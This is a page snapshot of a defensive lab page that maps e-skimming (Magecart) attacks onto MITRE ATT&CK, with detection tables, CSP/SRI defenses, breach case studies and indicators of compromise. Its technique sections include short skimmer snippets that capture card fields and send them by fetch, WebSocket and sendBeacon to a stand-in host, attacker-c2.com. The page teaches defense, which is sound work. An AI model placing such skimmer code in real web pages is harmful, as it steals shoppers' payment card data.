@@ -1,0 +1,654 @@
+# Page snapshot
+
+```yaml
+- generic [active] [ref=e1]:
+  - banner [ref=e2]:
+    - generic [ref=e3]:
+      - generic [ref=e4]:
+        - heading "MITRE ATT&CK Matrix for E-Skimming" [level=1] [ref=e5]
+        - generic [ref=e6]: v1.0
+      - paragraph [ref=e7]: Comprehensive framework for understanding, detecting, and defending against e-skimming attacks
+      - navigation [ref=e8]:
+        - link "← Back to Labs" [ref=e9] [cursor=pointer]:
+          - /url: http://localhost:8080
+        - link "Overview" [ref=e10] [cursor=pointer]:
+          - /url: "#overview"
+        - link "Tactics & Techniques" [ref=e11] [cursor=pointer]:
+          - /url: "#tactics"
+        - link "Detection" [ref=e12] [cursor=pointer]:
+          - /url: "#detection"
+        - link "Defense" [ref=e13] [cursor=pointer]:
+          - /url: "#defense"
+        - link "Case Studies" [ref=e14] [cursor=pointer]:
+          - /url: "#case-studies"
+        - link "IOCs" [ref=e15] [cursor=pointer]:
+          - /url: "#iocs"
+  - generic [ref=e16]:
+    - generic [ref=e17]:
+      - heading "Understanding E-Skimming Attack Patterns" [level=2] [ref=e18]
+      - paragraph [ref=e19]: E-skimming attacks have caused billions in damages and affected millions of customers worldwide. This framework provides comprehensive analysis of attack techniques, tactics, and procedures used by threat actors to compromise e-commerce platforms.
+      - generic [ref=e20]:
+        - generic [ref=e21]: Initial Access →
+        - generic [ref=e22]: Execution →
+        - generic [ref=e23]: Persistence →
+        - generic [ref=e24]: Defense Evasion →
+        - generic [ref=e25]: Collection →
+        - generic [ref=e26]: Exfiltration →
+        - generic [ref=e27]: Impact
+    - generic [ref=e28]:
+      - generic [ref=e29]:
+        - generic [ref=e30]: 380K
+        - generic [ref=e31]: British Airways Victims
+      - generic [ref=e32]:
+        - generic [ref=e33]: £20M
+        - generic [ref=e34]: ICO Fine (British Airways)
+      - generic [ref=e35]:
+        - generic [ref=e36]: 11K+
+        - generic [ref=e37]: Sites Compromised (CosmicSting)
+      - generic [ref=e38]:
+        - generic [ref=e39]: 13+
+        - generic [ref=e40]: Magecart Groups Active
+    - generic [ref=e41]:
+      - generic [ref=e42]:
+        - generic [ref=e43]: 📊
+        - heading "Overview" [level=2] [ref=e44]
+      - generic [ref=e45]:
+        - strong [ref=e46]: Document Information
+        - text: "Version 1.0 | Last Updated: 2025-01-18"
+        - text: "Target Environment: Web applications, e-commerce platforms, payment processing systems"
+      - paragraph [ref=e47]: This document presents a customized MITRE ATT&CK matrix specifically designed for e-skimming (web skimming, formjacking, Magecart) attacks. Based on extensive research and analysis of real-world e-skimming campaigns, this matrix maps attack techniques, tactics, and procedures (TTPs) used by threat actors to compromise e-commerce platforms and steal payment card data.
+      - generic [ref=e48]:
+        - generic [ref=e49]: 🎯
+        - heading "MITRE ATT&CK Matrix for E-Skimming" [level=2] [ref=e50]
+      - table [ref=e53]:
+        - rowgroup [ref=e54]:
+          - row "Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact" [ref=e55]:
+            - cell "Initial Access" [ref=e56]
+            - cell "Execution" [ref=e57]
+            - cell "Persistence" [ref=e58]
+            - cell "Privilege Escalation" [ref=e59]
+            - cell "Defense Evasion" [ref=e60]
+            - cell "Credential Access" [ref=e61]
+            - cell "Discovery" [ref=e62]
+            - cell "Lateral Movement" [ref=e63]
+            - cell "Collection" [ref=e64]
+            - cell "Command and Control" [ref=e65]
+            - cell "Exfiltration" [ref=e66]
+            - cell "Impact" [ref=e67]
+          - row "3 techniques 1 technique 2 techniques 0 techniques 4 techniques 0 techniques 1 technique 0 techniques 2 techniques 1 technique 1 technique 0 techniques" [ref=e68]:
+            - cell "3 techniques" [ref=e69]
+            - cell "1 technique" [ref=e70]
+            - cell "2 techniques" [ref=e71]
+            - cell "0 techniques" [ref=e72]
+            - cell "4 techniques" [ref=e73]
+            - cell "0 techniques" [ref=e74]
+            - cell "1 technique" [ref=e75]
+            - cell "0 techniques" [ref=e76]
+            - cell "2 techniques" [ref=e77]
+            - cell "1 technique" [ref=e78]
+            - cell "1 technique" [ref=e79]
+            - cell "0 techniques" [ref=e80]
+        - rowgroup [ref=e81]:
+          - row "T1190 Exploit Public-Facing Application T1078 Valid Accounts T1195 Supply Chain Compromise T1195.002 Compromise Software Dependencies T1059.007 JavaScript Execution T1554 Compromise Client Software T1176 Browser Extensions No techniques commonly used in e-skimming attacks T1027 Obfuscated Files or Information T1622 Debugger Evasion T1480 Execution Guardrails T1480.001 Geofencing T1036 Masquerading No techniques commonly used in e-skimming attacks T1083 File and Directory Discovery No techniques commonly used in e-skimming attacks T1056 Input Capture T1056.001 Keylogging T1056.002 GUI Input Capture T1005 Data from Local System T1071 Web Service T1041 Exfiltration Over C2 Channel No techniques commonly used in e-skimming attacks" [ref=e82]:
+            - cell "T1190 Exploit Public-Facing Application T1078 Valid Accounts T1195 Supply Chain Compromise T1195.002 Compromise Software Dependencies" [ref=e83]:
+              - generic [ref=e84]:
+                - link "T1190" [ref=e85] [cursor=pointer]:
+                  - /url: "#t1190"
+                - generic [ref=e86]: Exploit Public-Facing Application
+              - generic [ref=e87]:
+                - link "T1078" [ref=e88] [cursor=pointer]:
+                  - /url: "#t1078"
+                - generic [ref=e89]: Valid Accounts
+              - generic [ref=e90]:
+                - link "T1195" [ref=e91] [cursor=pointer]:
+                  - /url: "#t1195"
+                - generic [ref=e92]: Supply Chain Compromise
+                - generic [ref=e94]:
+                  - link "T1195.002" [ref=e95] [cursor=pointer]:
+                    - /url: "#t1195-002"
+                  - generic [ref=e96]: Compromise Software Dependencies
+            - cell "T1059.007 JavaScript Execution" [ref=e97]:
+              - generic [ref=e98]:
+                - link "T1059.007" [ref=e99] [cursor=pointer]:
+                  - /url: "#t1059-007"
+                - generic [ref=e100]: JavaScript Execution
+            - cell "T1554 Compromise Client Software T1176 Browser Extensions" [ref=e101]:
+              - generic [ref=e102]:
+                - link "T1554" [ref=e103] [cursor=pointer]:
+                  - /url: "#t1554"
+                - generic [ref=e104]: Compromise Client Software
+              - generic [ref=e105]:
+                - link "T1176" [ref=e106] [cursor=pointer]:
+                  - /url: "#t1176"
+                - generic [ref=e107]: Browser Extensions
+            - cell "No techniques commonly used in e-skimming attacks" [ref=e108]:
+              - generic [ref=e109]: No techniques commonly used in e-skimming attacks
+            - cell "T1027 Obfuscated Files or Information T1622 Debugger Evasion T1480 Execution Guardrails T1480.001 Geofencing T1036 Masquerading" [ref=e110]:
+              - generic [ref=e111]:
+                - link "T1027" [ref=e112] [cursor=pointer]:
+                  - /url: "#t1027"
+                - generic [ref=e113]: Obfuscated Files or Information
+              - generic [ref=e114]:
+                - link "T1622" [ref=e115] [cursor=pointer]:
+                  - /url: "#t1622"
+                - generic [ref=e116]: Debugger Evasion
+              - generic [ref=e117]:
+                - link "T1480" [ref=e118] [cursor=pointer]:
+                  - /url: "#t1480"
+                - generic [ref=e119]: Execution Guardrails
+                - generic [ref=e121]:
+                  - link "T1480.001" [ref=e122] [cursor=pointer]:
+                    - /url: "#t1480-001"
+                  - generic [ref=e123]: Geofencing
+              - generic [ref=e124]:
+                - link "T1036" [ref=e125] [cursor=pointer]:
+                  - /url: "#t1036"
+                - generic [ref=e126]: Masquerading
+            - cell "No techniques commonly used in e-skimming attacks" [ref=e127]:
+              - generic [ref=e128]: No techniques commonly used in e-skimming attacks
+            - cell "T1083 File and Directory Discovery" [ref=e129]:
+              - generic [ref=e130]:
+                - link "T1083" [ref=e131] [cursor=pointer]:
+                  - /url: "#t1083"
+                - generic [ref=e132]: File and Directory Discovery
+            - cell "No techniques commonly used in e-skimming attacks" [ref=e133]:
+              - generic [ref=e134]: No techniques commonly used in e-skimming attacks
+            - cell "T1056 Input Capture T1056.001 Keylogging T1056.002 GUI Input Capture T1005 Data from Local System" [ref=e135]:
+              - generic [ref=e136]:
+                - link "T1056" [ref=e137] [cursor=pointer]:
+                  - /url: "#t1056"
+                - generic [ref=e138]: Input Capture
+                - generic [ref=e139]:
+                  - generic [ref=e140]:
+                    - link "T1056.001" [ref=e141] [cursor=pointer]:
+                      - /url: "#t1056-001"
+                    - generic [ref=e142]: Keylogging
+                  - generic [ref=e143]:
+                    - link "T1056.002" [ref=e144] [cursor=pointer]:
+                      - /url: "#t1056-002"
+                    - generic [ref=e145]: GUI Input Capture
+              - generic [ref=e146]:
+                - link "T1005" [ref=e147] [cursor=pointer]:
+                  - /url: "#t1005"
+                - generic [ref=e148]: Data from Local System
+            - cell "T1071 Web Service" [ref=e149]:
+              - generic [ref=e150]:
+                - link "T1071" [ref=e151] [cursor=pointer]:
+                  - /url: "#t1071"
+                - generic [ref=e152]: Web Service
+            - cell "T1041 Exfiltration Over C2 Channel" [ref=e153]:
+              - generic [ref=e154]:
+                - link "T1041" [ref=e155] [cursor=pointer]:
+                  - /url: "#t1041"
+                - generic [ref=e156]: Exfiltration Over C2 Channel
+            - cell "No techniques commonly used in e-skimming attacks" [ref=e157]:
+              - generic [ref=e158]: No techniques commonly used in e-skimming attacks
+    - generic [ref=e159]:
+      - generic [ref=e160]:
+        - generic [ref=e161]: 🎯
+        - heading "MITRE ATT&CK Tactics and Techniques" [level=2] [ref=e162]
+      - 'heading "TA0001: Initial Access" [level=3] [ref=e163]'
+      - paragraph [ref=e164]: The techniques used by attackers to gain initial entry into the target e-commerce infrastructure.
+      - generic [ref=e165]:
+        - generic [ref=e166]:
+          - generic [ref=e168]: T1190
+          - heading "Exploit Public-Facing Application" [level=4] [ref=e169]
+          - paragraph [ref=e170]: Exploitation of vulnerabilities in e-commerce platforms to gain access.
+          - generic [ref=e171]:
+            - generic [ref=e172]:
+              - generic [ref=e173]: "Key Example:"
+              - generic [ref=e174]: CVE-2024-34102 (CosmicSting) - XXE vulnerability in Adobe Commerce/Magento 2.4.7 with CVSS 9.8/10
+            - generic [ref=e175]:
+              - generic [ref=e176]: "Impact:"
+              - generic [ref=e177]: 3x increase in Magecart infections (11,000+ domains in 2024)
+            - generic [ref=e178]:
+              - generic [ref=e179]: "Detection:"
+              - generic [ref=e180]: WAF logs, unusual HTTP requests, XXE entity expansion
+        - generic [ref=e181]:
+          - generic [ref=e183]: T1078
+          - heading "Valid Accounts (Stolen Credentials)" [level=4] [ref=e184]
+          - paragraph [ref=e185]: Use of stolen or compromised credentials to access e-commerce admin panels.
+          - generic [ref=e186]:
+            - generic [ref=e187]:
+              - generic [ref=e188]: "Examples:"
+              - generic [ref=e189]: British Airways (2018), Newegg (2018)
+            - generic [ref=e190]:
+              - generic [ref=e191]: "Method:"
+              - generic [ref=e192]: Phishing, info-stealer malware, credential stuffing
+            - generic [ref=e193]:
+              - generic [ref=e194]: "Detection:"
+              - generic [ref=e195]: Unusual login times/locations, VPN usage, off-hours access
+        - generic [ref=e196]:
+          - generic [ref=e198]: T1195
+          - heading "Supply Chain Compromise" [level=4] [ref=e199]
+          - paragraph [ref=e200]: Manipulation of third-party services, libraries, or dependencies to inject malicious code.
+          - generic [ref=e201]:
+            - generic [ref=e202]:
+              - generic [ref=e203]: "Examples:"
+              - generic [ref=e204]: Ticketmaster (Inbenta chatbot - 40K victims), Forbes (fontsawesome.gq)
+            - generic [ref=e205]:
+              - generic [ref=e206]: "Targets:"
+              - generic [ref=e207]: CDN providers, analytics services, chat widgets, browser extensions
+            - generic [ref=e208]:
+              - generic [ref=e209]: "Detection:"
+              - generic [ref=e210]: SRI hash mismatches, CSP violations, unexpected script changes
+      - 'heading "TA0002: Execution" [level=3] [ref=e211]'
+      - paragraph [ref=e212]: Techniques used to run malicious code on the victim's browser or server.
+      - generic [ref=e213]:
+        - generic [ref=e214] [cursor=pointer]:
+          - 'heading "T1059.007: JavaScript Execution" [level=4] [ref=e215]'
+          - generic [ref=e216]: ▼
+        - generic [ref=e217]:
+          - paragraph [ref=e218]:
+            - strong [ref=e219]: "Description:"
+            - text: Execution of malicious JavaScript in the victim's browser. All e-skimming attacks execute JavaScript client-side.
+          - heading "Attack Patterns:" [level=4] [ref=e220]
+          - list [ref=e221]:
+            - listitem [ref=e222]:
+              - strong [ref=e223]: "Form Submission Interception:"
+              - code [ref=e224]: addEventListener('submit', stealData)
+            - listitem [ref=e225]:
+              - strong [ref=e226]: "DOM-Based Monitoring:"
+              - text: MutationObserver API, Shadow DOM abuse
+            - listitem [ref=e227]:
+              - strong [ref=e228]: "Extension-Based Execution:"
+              - text: Content scripts across all websites
+          - code [ref=e230]: "// Form interception example document.addEventListener('submit', function(e) { var cardData = extractPaymentData(); exfiltrateToC2(cardData); }); // Real-time monitoring document.addEventListener('input', function(e) { if (isPaymentField(e.target)) { captureKeystroke(e.target.value); } });"
+          - paragraph [ref=e231]:
+            - strong [ref=e232]: "Detection:"
+            - text: Unexpected event listeners on payment forms, CSP violations, browser extension anomalies
+      - 'heading "TA0003: Persistence" [level=3] [ref=e233]'
+      - paragraph [ref=e234]: Techniques to maintain access and continue operations over extended periods.
+      - generic [ref=e235]:
+        - generic [ref=e236]:
+          - generic [ref=e238]: T1554
+          - heading "File Modification (Compromise Client Software)" [level=4] [ref=e239]
+          - paragraph [ref=e240]: Modification of legitimate JavaScript files to include skimmer code.
+          - generic [ref=e241]:
+            - generic [ref=e242]:
+              - generic [ref=e243]: "Example:"
+              - generic [ref=e244]: British Airways - 22 lines appended to Modernizr library (15 days, 380K victims)
+            - generic [ref=e245]:
+              - generic [ref=e246]: "Duration:"
+              - generic [ref=e247]: Average 47 days undetected, range 2 weeks to 6 months
+            - generic [ref=e248]:
+              - generic [ref=e249]: "Detection:"
+              - generic [ref=e250]: File integrity monitoring (FIM), git diff alerts, code review
+        - generic [ref=e251]:
+          - generic [ref=e253]: T1176
+          - heading "Browser Extensions" [level=4] [ref=e254]
+          - paragraph [ref=e255]: Use of malicious or compromised browser extensions for persistent access.
+          - generic [ref=e256]:
+            - generic [ref=e257]:
+              - generic [ref=e258]: "Examples:"
+              - generic [ref=e259]: DataSpii, Great Suspender, crypto wallet extensions
+            - generic [ref=e260]:
+              - generic [ref=e261]: "Capabilities:"
+              - generic [ref=e262]: Cross-site access, bypass same-origin policy, persistent across sessions
+            - generic [ref=e263]:
+              - generic [ref=e264]: "Detection:"
+              - generic [ref=e265]: Excessive permissions, unexpected updates, network traffic from background scripts
+      - 'heading "TA0005: Defense Evasion" [level=3] [ref=e266]'
+      - paragraph [ref=e267]: Techniques to avoid detection by security tools and analysts.
+      - generic [ref=e268]:
+        - generic [ref=e269]:
+          - generic [ref=e271]: T1027
+          - heading "Obfuscated Files or Information" [level=4] [ref=e272]
+          - paragraph [ref=e273]: Code obfuscation to evade detection and analysis.
+          - generic [ref=e274]:
+            - generic [ref=e275]:
+              - generic [ref=e276]: "Techniques:"
+              - generic [ref=e277]: Base64 encoding, multi-layer encoding, obfuscator.io, dead code injection
+            - generic [ref=e278]:
+              - generic [ref=e279]: "Examples:"
+              - generic [ref=e280]: Kritec skimmer, Gateway skimmer (multiple layers)
+            - generic [ref=e281]:
+              - generic [ref=e282]: "Detection:"
+              - generic [ref=e283]: High entropy, eval() with encoded args, static analysis tools
+        - generic [ref=e284]:
+          - generic [ref=e286]: T1622
+          - heading "Debugger Evasion" [level=4] [ref=e287]
+          - paragraph [ref=e288]: Anti-debugging techniques to prevent security analysis.
+          - generic [ref=e289]:
+            - generic [ref=e290]:
+              - generic [ref=e291]: "Methods:"
+              - generic [ref=e292]: Firebug detection, debugger statements, timing attacks, console override
+            - generic [ref=e293]:
+              - generic [ref=e294]: "Example:"
+              - generic [ref=e295]: Gateway skimmer checks for Firebug/DevTools
+        - generic [ref=e296]:
+          - generic [ref=e298]: T1480
+          - heading "Execution Guardrails (Geofencing)" [level=4] [ref=e299]
+          - paragraph [ref=e300]: Conditional execution based on environment to evade detection.
+          - generic [ref=e301]:
+            - generic [ref=e302]:
+              - generic [ref=e303]: "Techniques:"
+              - generic [ref=e304]: Country filtering, VPN detection, browser fingerprinting, VM detection (WebGL)
+            - generic [ref=e305]:
+              - generic [ref=e306]: "Detection:"
+              - generic [ref=e307]: Environment checks, geolocation API usage, WebGL renderer queries
+        - generic [ref=e308]:
+          - generic [ref=e310]: T1036
+          - heading "Masquerading" [level=4] [ref=e311]
+          - paragraph [ref=e312]: Disguising malicious code as legitimate services or libraries.
+          - generic [ref=e313]:
+            - generic [ref=e314]:
+              - generic [ref=e315]: "Methods:"
+              - generic [ref=e316]: GTM disguise, analytics domains, 404 page hiding, image steganography
+            - generic [ref=e317]:
+              - generic [ref=e318]: "Example:"
+              - generic [ref=e319]: Segway (2022) - 600K+ records via image-hidden code
+      - 'heading "TA0009: Collection" [level=3] [ref=e320]'
+      - paragraph [ref=e321]: Techniques to gather payment card data and personal information from victims.
+      - generic [ref=e322]:
+        - generic [ref=e323] [cursor=pointer]:
+          - 'heading "T1056: Input Capture" [level=4] [ref=e324]'
+          - generic [ref=e325]: ▼
+        - generic [ref=e326]:
+          - paragraph [ref=e327]:
+            - strong [ref=e328]: "Description:"
+            - text: Capturing user input from payment forms.
+          - heading "Sub-Techniques:" [level=4] [ref=e329]
+          - list [ref=e330]:
+            - listitem [ref=e331]:
+              - strong [ref=e332]: "T1056.001 Keylogging:"
+              - text: Real-time keystroke capture as user types
+            - listitem [ref=e333]:
+              - strong [ref=e334]: "T1056.002 GUI Input Capture:"
+              - text: Form submission interception, change event monitoring
+          - heading "Data Collected:" [level=4] [ref=e335]
+          - list [ref=e336]:
+            - listitem [ref=e337]: Payment card data (number, CVV, expiry, cardholder name)
+            - listitem [ref=e338]: Billing information (address, ZIP, phone, email)
+            - listitem [ref=e339]: Personal information (name, email, account credentials)
+            - listitem [ref=e340]: Session data (cookies, localStorage, sessionStorage)
+            - listitem [ref=e341]: Device fingerprint (browser, OS, screen resolution, timezone)
+          - code [ref=e343]: "// Form submission interception document.querySelector('form').addEventListener('submit', function(e) { var cardData = { number: document.querySelector('#card-number').value, cvv: document.querySelector('#cvv').value, expiry: document.querySelector('#expiry').value, billing: {/* ... */} }; exfiltrate(cardData); });"
+          - paragraph [ref=e344]:
+            - strong [ref=e345]: "Detection:"
+            - text: Unexpected event listeners on payment forms, input event handlers, localStorage writes with payment data
+      - generic [ref=e347]:
+        - generic [ref=e349]: T1005
+        - heading "Data from Local System" [level=4] [ref=e350]
+        - paragraph [ref=e351]: Collection of data stored locally in browser storage.
+        - generic [ref=e352]:
+          - generic [ref=e353]:
+            - generic [ref=e354]: "Targets:"
+            - generic [ref=e355]: localStorage, sessionStorage, cookies, IndexedDB
+          - generic [ref=e356]:
+            - generic [ref=e357]: "Example:"
+            - generic [ref=e358]: Multi-form Magecart collecting data across multiple pages
+      - 'heading "TA0010: Exfiltration" [level=3] [ref=e359]'
+      - paragraph [ref=e360]: Techniques to transmit stolen payment data to attacker-controlled infrastructure.
+      - generic [ref=e361]:
+        - generic [ref=e362] [cursor=pointer]:
+          - 'heading "T1041: Exfiltration Over C2 Channel" [level=4] [ref=e363]'
+          - generic [ref=e364]: ▼
+        - generic [ref=e365]:
+          - paragraph [ref=e366]:
+            - strong [ref=e367]: "Description:"
+            - text: Sending stolen data to command and control servers.
+          - heading "Exfiltration Methods:" [level=4] [ref=e368]
+          - generic [ref=e369]:
+            - generic [ref=e370]:
+              - heading "HTTP POST (Most Common)" [level=4] [ref=e371]
+              - code [ref=e373]: "fetch('https://attacker-c2.com/collect', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(stolenData), mode: 'no-cors' });"
+            - generic [ref=e374]:
+              - heading "WebSocket" [level=4] [ref=e375]
+              - code [ref=e377]: "var ws = new WebSocket('wss://attacker-c2.com/ws'); ws.onopen = function() { ws.send(JSON.stringify(stolenData)); };"
+            - generic [ref=e378]:
+              - heading "Beacon API" [level=4] [ref=e379]
+              - code [ref=e381]: navigator.sendBeacon( 'https://attacker-c2.com/beacon', JSON.stringify(stolenData) );
+          - heading "C2 Domain Characteristics:" [level=4] [ref=e382]
+          - list [ref=e383]:
+            - listitem [ref=e384]:
+              - strong [ref=e385]: "Lookalike domains:"
+              - text: google-analytics.net, analytics-cdn.com
+            - listitem [ref=e386]:
+              - strong [ref=e387]: "British Airways example:"
+              - text: baways.com (lookalike domain)
+            - listitem [ref=e388]:
+              - strong [ref=e389]: "Fast flux:"
+              - text: Rapidly changing IP addresses
+            - listitem [ref=e390]:
+              - strong [ref=e391]: "Bulletproof hosting:"
+              - text: Resistant to takedown
+          - paragraph [ref=e392]:
+            - strong [ref=e393]: "Detection:"
+            - text: Unexpected POST requests, WebSocket to unusual domains, Beacon API in payment context, requests to newly registered domains
+    - generic [ref=e394]:
+      - generic [ref=e395]:
+        - generic [ref=e396]: 🔍
+        - heading "Detection & Mitigation Matrix" [level=2] [ref=e397]
+      - table [ref=e399]:
+        - rowgroup [ref=e400]:
+          - row "Attack Stage Detection Method Tools Indicators" [ref=e401]:
+            - cell "Attack Stage" [ref=e402]
+            - cell "Detection Method" [ref=e403]
+            - cell "Tools" [ref=e404]
+            - cell "Indicators" [ref=e405]
+        - rowgroup [ref=e406]:
+          - row "Initial Access Log monitoring, WAF SIEM, WAF, Access Reviews Unusual admin access, exploit attempts" [ref=e407]:
+            - cell "Initial Access" [ref=e408]:
+              - strong [ref=e409]: Initial Access
+            - cell "Log monitoring, WAF" [ref=e410]
+            - cell "SIEM, WAF, Access Reviews" [ref=e411]
+            - cell "Unusual admin access, exploit attempts" [ref=e412]
+          - row "Execution CSP violations, script analysis Browser DevTools, Semgrep, AI analysis Unexpected scripts, CSP reports" [ref=e413]:
+            - cell "Execution" [ref=e414]:
+              - strong [ref=e415]: Execution
+            - cell "CSP violations, script analysis" [ref=e416]
+            - cell "Browser DevTools, Semgrep, AI analysis" [ref=e417]
+            - cell "Unexpected scripts, CSP reports" [ref=e418]
+          - row "Persistence SDLC integrity checks, CDN/WAF injection monitoring OSSEC, Tripwire File modifications, unauthorized changes" [ref=e419]:
+            - cell "Persistence" [ref=e420]:
+              - strong [ref=e421]: Persistence
+            - cell "SDLC integrity checks, CDN/WAF injection monitoring" [ref=e422]
+            - cell "OSSEC, Tripwire" [ref=e423]
+            - cell "File modifications, unauthorized changes" [ref=e424]
+          - row "Defense Evasion Static analysis, deobfuscation, selective execution de4js, JsDeObsBench, js-beautify, script analysis High entropy, eval(), obfuscation, detection of analysis tools/environment" [ref=e425]:
+            - cell "Defense Evasion" [ref=e426]:
+              - strong [ref=e427]: Defense Evasion
+            - cell "Static analysis, deobfuscation, selective execution" [ref=e428]
+            - cell "de4js, JsDeObsBench, js-beautify, script analysis" [ref=e429]:
+              - text: de4js,
+              - link "JsDeObsBench" [ref=e430] [cursor=pointer]:
+                - /url: https://jsdeobf.github.io/
+              - text: ", js-beautify, script analysis"
+            - cell "High entropy, eval(), obfuscation, detection of analysis tools/environment" [ref=e431]
+          - row "Collection Runtime monitoring, event analysis Custom scripts, extensions Unexpected form access, input listeners, form overlay" [ref=e432]:
+            - cell "Collection" [ref=e433]:
+              - strong [ref=e434]: Collection
+            - cell "Runtime monitoring, event analysis" [ref=e435]
+            - cell "Custom scripts, extensions" [ref=e436]
+            - cell "Unexpected form access, input listeners, form overlay" [ref=e437]
+          - row "Exfiltration 3rd party key/id monitor, CSP-report-only CSP-report-only custom monitor, HAR change detection New domains, especially typo-squatted ones" [ref=e438]:
+            - cell "Exfiltration" [ref=e439]:
+              - strong [ref=e440]: Exfiltration
+            - cell "3rd party key/id monitor, CSP-report-only" [ref=e441]
+            - cell "CSP-report-only custom monitor, HAR change detection" [ref=e442]
+            - cell "New domains, especially typo-squatted ones" [ref=e443]
+    - generic [ref=e444]:
+      - generic [ref=e445]:
+        - generic [ref=e446]: 🛡️
+        - heading "Defense Strategies" [level=2] [ref=e447]
+      - generic [ref=e448]:
+        - generic [ref=e449]:
+          - generic [ref=e451]: Preventive
+          - heading "Content Security Policy (CSP)" [level=4] [ref=e452]
+          - paragraph [ref=e453]: Restrict script sources and block unauthorized scripts.
+          - code [ref=e455]: <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted-cdn.com; connect-src 'self'; report-uri /csp-report">
+          - generic [ref=e457]:
+            - generic [ref=e458]: "Mitigates:"
+            - generic [ref=e459]: Unauthorized script execution, inline scripts
+        - generic [ref=e460]:
+          - generic [ref=e462]: Preventive
+          - heading "Subresource Integrity (SRI)" [level=4] [ref=e463]
+          - paragraph [ref=e464]: Cryptographic hash verification for external scripts.
+          - code [ref=e466]: <script src="https://cdn.example.com/lib.js" integrity="sha384-oqVuAfXRKap7..." crossorigin="anonymous"></script>
+          - generic [ref=e468]:
+            - generic [ref=e469]: "Mitigates:"
+            - generic [ref=e470]: CDN compromise, unauthorized script modifications
+        - generic [ref=e471]:
+          - generic [ref=e473]: Preventive
+          - heading "Multi-Factor Authentication (MFA)" [level=4] [ref=e474]
+          - paragraph [ref=e475]: Prevent credential-based compromise of admin accounts.
+          - generic [ref=e476]:
+            - generic [ref=e477]:
+              - generic [ref=e478]: "Mitigates:"
+              - generic [ref=e479]: Stolen credentials, phishing, credential stuffing
+            - generic [ref=e480]:
+              - generic [ref=e481]: "Required:"
+              - generic [ref=e482]: All admin accounts, developer access, production systems
+        - generic [ref=e483]:
+          - generic [ref=e485]: Detective
+          - heading "File Integrity Monitoring (FIM)" [level=4] [ref=e486]
+          - paragraph [ref=e487]: Detect unauthorized file modifications in real-time.
+          - generic [ref=e488]:
+            - generic [ref=e489]:
+              - generic [ref=e490]: "Tools:"
+              - generic [ref=e491]: OSSEC, Tripwire, AIDE
+            - generic [ref=e492]:
+              - generic [ref=e493]: "Coverage:"
+              - generic [ref=e494]: All production JavaScript, HTML, CSS files
+        - generic [ref=e495]:
+          - generic [ref=e497]: Detective
+          - heading "Network Monitoring" [level=4] [ref=e498]
+          - paragraph [ref=e499]: Monitor all outbound traffic from checkout pages.
+          - generic [ref=e500]:
+            - generic [ref=e501]:
+              - generic [ref=e502]: "Tools:"
+              - generic [ref=e503]: Suricata, Snort, Zeek
+            - generic [ref=e504]:
+              - generic [ref=e505]: "Alerts:"
+              - generic [ref=e506]: Requests to unknown/suspicious domains
+        - generic [ref=e507]:
+          - generic [ref=e509]: Detective
+          - heading "Behavioral Monitoring" [level=4] [ref=e510]
+          - paragraph [ref=e511]: Monitor form field access patterns and event listeners.
+          - code [ref=e513]: "// Monitor unauthorized form access Object.defineProperty(HTMLInputElement.prototype, 'value', { get: function() { if (isPaymentField(this) && !isAuthorized()) { console.trace('Unauthorized access!'); } return originalGetter.call(this); } });"
+    - generic [ref=e514]:
+      - generic [ref=e515]:
+        - generic [ref=e516]: 📚
+        - heading "Real-World Case Studies" [level=2] [ref=e517]
+      - generic [ref=e518]:
+        - generic [ref=e519]:
+          - generic [ref=e520]: British Airways (August 2018)
+          - generic [ref=e521]:
+            - strong [ref=e522]: "Attack Chain:"
+            - text: Initial Access (T1078) → Execution (T1059.007) → Persistence (T1554) → Collection (T1056.002) → Exfiltration (T1041)
+            - strong [ref=e523]: "Details:"
+            - text: Stolen admin credentials (no MFA) → Modified Modernizr library → 22-line skimmer → Form submission interception → HTTP POST to baways.com
+            - strong [ref=e524]: "Impact:"
+            - text: 380,000 victims | 15 days undetected | £20M ICO fine
+            - strong [ref=e525]: "Detection Failure:"
+            - text: No FIM, no behavioral monitoring, discovered via customer fraud reports
+        - generic [ref=e526]:
+          - generic [ref=e527]: Ticketmaster (June 2018)
+          - generic [ref=e528]:
+            - strong [ref=e529]: "Attack Chain:"
+            - text: Supply Chain Compromise (T1195.002) → Execution (T1059.007) → Collection (T1056) → Exfiltration (T1041)
+            - strong [ref=e530]: "Details:"
+            - text: Compromised Inbenta chatbot third-party service → Malicious code in chatbot script
+            - strong [ref=e531]: "Impact:"
+            - text: 40,000 victims | £1.25M fine
+            - strong [ref=e532]: "Key Lesson:"
+            - text: Third-party scripts require SRI and CSP controls
+        - generic [ref=e533]:
+          - generic [ref=e534]: CosmicSting / CVE-2024-34102 (2024)
+          - generic [ref=e535]:
+            - strong [ref=e536]: "Attack Chain:"
+            - text: Exploit Vulnerability (T1190) → Execution → Persistence
+            - strong [ref=e537]: "Details:"
+            - text: XXE vulnerability in Adobe Commerce/Magento 2.4.7 (CVSS 9.8) → Remote code execution → Skimmer installation
+            - strong [ref=e538]: "Impact:"
+            - text: 3x increase in Magecart infections | 11,000+ domains compromised
+            - strong [ref=e539]: "Detection:"
+            - text: WAF rules for XXE, unusual XML requests, file system changes
+    - generic [ref=e540]:
+      - generic [ref=e541]:
+        - generic [ref=e542]: ⚠️
+        - heading "Indicators of Compromise (IOCs)" [level=2] [ref=e543]
+      - generic [ref=e544]:
+        - generic [ref=e545]:
+          - heading "Network Indicators" [level=4] [ref=e546]
+          - list [ref=e547]:
+            - listitem [ref=e548]: Newly registered domains (< 30 days)
+            - listitem [ref=e549]: Bulletproof hosting providers
+            - listitem [ref=e550]: Typosquatting domains (baways.com, fontsawesome.gq)
+            - listitem [ref=e551]: POST requests from checkout to unknown domains
+            - listitem [ref=e552]: WebSocket connections to non-legitimate endpoints
+            - listitem [ref=e553]: Large URL parameters on image requests
+        - generic [ref=e554]:
+          - heading "Host Indicators" [level=4] [ref=e555]
+          - list [ref=e556]:
+            - listitem [ref=e557]: Modified JavaScript files outside deploy windows
+            - listitem [ref=e558]: Unexpected event listeners on payment forms
+            - listitem [ref=e559]: localStorage/sessionStorage with payment field names
+            - listitem [ref=e560]: Browser extensions with excessive permissions
+            - listitem [ref=e561]: File hash mismatches for production scripts
+        - generic [ref=e562]:
+          - heading "Code Indicators" [level=4] [ref=e563]
+          - list [ref=e564]:
+            - listitem [ref=e565]:
+              - code [ref=e566]: eval(atob(...))
+              - text: patterns
+            - listitem [ref=e567]: High-entropy variable names (_0x1a2b3c)
